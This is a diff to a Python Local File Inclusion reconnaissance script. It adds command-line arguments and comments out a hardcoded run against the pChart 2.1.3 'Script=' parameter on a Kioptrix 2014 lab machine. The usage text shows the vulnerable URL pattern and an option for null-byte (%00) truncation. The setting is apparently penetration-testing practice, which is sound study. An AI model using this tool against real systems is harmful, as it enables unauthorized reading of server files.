@@ -1,4 +1,5 @@
 import requests
+import sys
 
 # Local File Inclusion Recon
 #
@@ -234,5 +235,24 @@ class LFIRecon(object):
 #recon.recover()
 
 ### Kioptrix 2014
-recon = LFIRecon("http://192.168.209.144/pChart2.1.3/examples/index.php?Action=View&Script=", "something went wrong with your", False, True, False)
-recon.recover()
+#recon = LFIRecon("http://192.168.209.144/pChart2.1.3/examples/index.php?Action=View&Script=", "something went wrong with your", False, True, False)
+#recon.recover()
+
+if len(sys.argv) < 3:
+        print("Usage: python lfi_working_paths.py")
+        print("       <REQUIRED: vulnerable URL>")
+        print("       <REQUIRED: error message that indicates failure>")
+        print("       <OPTIONAL: extensive search = FALSE>")
+        print("       <OPTIONAL: write to output = TRUE>")
+        print("       <OPTIONAL: append %00 at the end = FALSE>")
+        print("")
+        print("Examples:")
+        print(">python lfi_working_paths.py http://192.168.209.144/pChart2.1.3/examples/index.php?Action=View&Script= 'something went wrong with your'")
+        print(">python lfi_working_paths.py http://192.168.209.144/pChart2.1.3/examples/index.php?Action=View&Script= 'something went wrong with your' false false false")
+elif len(sys.argv) == 3:
+        recon = LFIRecon(sys.argv[1], sys.argv[2], False, True, False)
+        recon.recover()
+else:
+        
+        recon = LFIRecon(sys.argv[1], sys.argv[2], "true".lower() in sys.argv[3], "true".lower() in sys.argv[4], "true".lower() in sys.argv[5])
+        recon.recover()
